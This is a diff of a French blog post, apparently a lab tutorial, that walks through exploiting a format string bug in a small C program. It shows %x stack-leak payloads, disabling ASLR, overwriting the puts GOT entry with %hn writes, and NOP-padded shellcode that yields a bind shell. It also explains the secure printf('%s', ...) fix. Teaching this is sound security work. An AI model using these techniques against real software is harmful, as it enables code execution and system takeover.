@@ -30,7 +30,7 @@ J'essaierai d'être assez pédagogique, le cas ci-dessous étant un cas basique 
 ```  
 
 Voici le code que nous allons utiliser:
-```
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -52,11 +52,13 @@ int main(int argc, char const *argv[])
 L'exécution est simple:  
 
 ![fmt1]({{ site.url }}/public/images/fmt/fmt1.png)  
+
 Fuzzons juste pour vérifier que le fgets fait bien son boulot et que nous évitons un débordement classique:  
 
 ![fmt2]({{ site.url }}/public/images/fmt/fmt2.png)  
+
 Maintenant faisons un autre test:
-```
+```bash
 #python -c 'print "%x"*100' | ./simple
 Your input: 65b7fb05a0b7fffc08bffff27f025c10000257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578782578b7fb03dcbffff2f00b7e152761b7fb00000b7e152761bffff384bffff38c000b7fb0000b7fffc04b7fff00001Au revoir
 ```
@@ -66,7 +68,7 @@ Wowowo ça y est je suis l'élu, je sais lire la matrice?!
 Ce qui se passe ici est du au ```printf(argument);```. Ceci est valable avec toutes les fonctions similaires printf, fprintf, sprintf, snprintf, vprintf, vfprintf, vsprintf, vsnprintf.  
   
 La version secure aurait été ```printf("%s",argument);``` pour forcer l'interprétation des données en tant que chaine de caractères:
-```
+```bash
 Your input: 
 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
@@ -76,19 +78,19 @@ Au revoir
 Avec ```printf(argument);```, vous pouvez injecter des formateurs qui demanderont à la fonction printf de dépiler de la stack autant d'arguments que de formateurs. Ceci nous permettra de lire la mémoire de notre exécutable et nous le verrons d'écraser des adresses pour rediriger vers notre flot d'exécution.  
   
 Avez-vous remarqué la suite **25782578257825782578** affichée avec le formateur **%x** ?:
-```
+```bash
 echo -n 2578 | xxd -p -r
 %x
 ```
   
 Nous pouvons lire depuis la mémoire notre argument passé à notre exécutable.
-```
+```bash
 python -c 'print "A"*20 + "-%x"*20' | ./simple
 Your input: 
 AAAAAAAAAAAAAAAAAAAA-65-b7fb05a0-b7fffc08-bffff27f-0-41c10000-41414141-41414141-41414141-41414141-2d414141-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d
 Au revoir
 ```  
-```
+```bash
 python -c 'print "A"*23 + "-%6$x"' | ./simple
 Your input: 
 AAAAAAAAAAAAAAAAAAAA-41c10000
@@ -99,7 +101,7 @@ Here we go, nous trouvons le premier élement de notre buffer, le caractère 'A'
 En effet le formateur %x lira le bloque de 32 bits comme une adresse, affichant en premier les octets de poids fort (donc stockés le plus à droite).  
   
 Nous continuerons sous GDB et nous supprimons avant toute protection de la pile:
-```
+```bash
 echo 0 > /proc/sys/kernel/randomize_va_space
 ```
   
@@ -109,14 +111,17 @@ cf [Wikipédia](https://fr.wikipedia.org/wiki/Address_space_layout_randomization
 Positionnons un breakpoint juste avant notre appel printf:  
 
 ![fmt3]({{ site.url }}/public/images/fmt/fmt3.png)  
+
 Maintenant injectons à nouveau le buffer de 100 caractères et examinons la mémoire juste après l'exécution de notre printf. Pour rappel une cheatsheet sympa en matière de BOs et de fonctionnement de la pile se trouve ici: [https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png](https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png).  
 
 ![fmt4]({{ site.url }}/public/images/fmt/fmt4.png)  
+
 Il est logique de voir apparaitre notre buffer dans des adresses plus hautes sur la stack, les segments de cette dernière étant alloués sur des adresses décroissantes (les plus hautes vers les plus basses) et **printf** étant appelée après l'initialisation de notre buffer.   
   
 Nous pouvons en déduire l'adresse de début de notre buffer. Cependant pour avoir des adresses continues, nous prendrons un byte plus loin: **0xbffff24c**.  
   
 ![fmt5]({{ site.url }}/public/images/fmt/fmt5.png)  
+
 Maintenant revenons sur le formateur **%n**:  
 *%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.*
   
@@ -128,25 +133,31 @@ Nous prendrons la fonction puts. Pourquoi ? car cette dernière est appelée jus
 **[objdump](https://linux.die.net/man/1/objdump)** est une command qui nous fournit diverses informations sur les fichiers objet.  
 *-R : Print the dynamic relocation entries of the file.*
   
-![fmt6]({{ site.url }}/public/images/fmt/fmt6.png)   
+![fmt6]({{ site.url }}/public/images/fmt/fmt6.png)  
+
 L'adresse peut également être trouvée de cette façon:  
 
 ![fmt7]({{ site.url }}/public/images/fmt/fmt7.png)  
+
 From [Wikipedia](https://en.wikipedia.org/wiki/Relocation_%28computing%29): *The relocation table is a list of pointers created by the compiler or assembler and stored in the object or executable file. Each entry in the table, or "fixup", is a pointer to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location.*
   
 ```jmp *0x804a014``` nous montre que l'on va faire un jump à l'adresse contenue à l'adresse *0x804a014*.  
 
 ![fmt8]({{ site.url }}/public/images/fmt/fmt8.png)  
+
 Let's check in gdb:  
 
 ![fmt9]({{ site.url }}/public/images/fmt/fmt9.png)  
+
 Il semblerait que nous puissions écrire sur ce segment mémoire. Comment allons-nous procéder?  
 D'abord injectons l'adresse mémoire à laquelle nous souhaitons écrire:  
 
 ![fmt10]({{ site.url }}/public/images/fmt/fmt10.png)  
+
 On définit maintenant un point d'arrêt cette fois juste avant l'appel à la fonction printf:  
 
 ![fmt11]({{ site.url }}/public/images/fmt/fmt11.png)  
+
 Bingo. On voit bien que l'adresse a été écrasée et que nous avons une **segmentation fault**.  
   
 Maintenant la partie sensible, l'écriture de cette adresse. Pour écrire cette adresse nous utiliserons le formateur **%7$hn** dans notre cas. L'instruction de formatage **%hn** n'écrit que sur **16 octets**.  
@@ -180,6 +191,7 @@ Maintenant déterminons l'adresse précise de notre shellcode:
 ```  
   
 ![fmt12]({{ site.url }}/public/images/fmt/fmt12.png)  
+
 **0xbffff26c** semble être un bon candidat. On ajoutera quelques NOPs également comme marge de manoeuvre, l'objectif étant de tomber dans nos NOPs et de slider jusqu'à notre shellcode.  
   
 Ok maintenant les calculs:  
@@ -191,7 +203,7 @@ Calcul de la première partie de l'adresse (conversion décimale):
 (gdb) print 0xbfff - 9 
 $3 = 49142
 ```
-```
+```bash
 printf "%x\n" 49142
 0xbff6
 ```
@@ -208,6 +220,7 @@ Ensuite on teste:
 ```
   
 ![fmt13]({{ site.url }}/public/images/fmt/fmt13.png)  
+
 un rapide calcul nous montre qu'il nous reste **63 bytes** pour notre shellcode. 
   
 Allons faire notre marché sur [shell-storm](http://shell-storm.org/shellcode/) (cocorico!).  
@@ -220,12 +233,15 @@ Nous adaptons donc notre payload et le testons sous gdb:
 ```
   
 ![fmt14]({{ site.url }}/public/images/fmt/fmt14.png)  
+
 Here we go, essayons de nous connecter:  
 
 ![fmt15]({{ site.url }}/public/images/fmt/fmt15.png)  
+
 Du coté de notre shellcode:  
 
 ![fmt16]({{ site.url }}/public/images/fmt/fmt16.png)  
+
 Nous pouvons donc en conclure qu'à partir d'un simple appel *printf*, il a été possible d'exécuter un bind shell. Bien évidemment ceci est un cas d'école et a été possible grâce à la désactivation de l'ASLR, rendant ainsi nos adresses prédictibles.
 
 Pour conclure, si vous rencontrez un souci entre l'exécution dans l'environnement gdb et votre shell, voici une réponse: [https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it). Assurez-vous que les environnements soient strictement identiques.
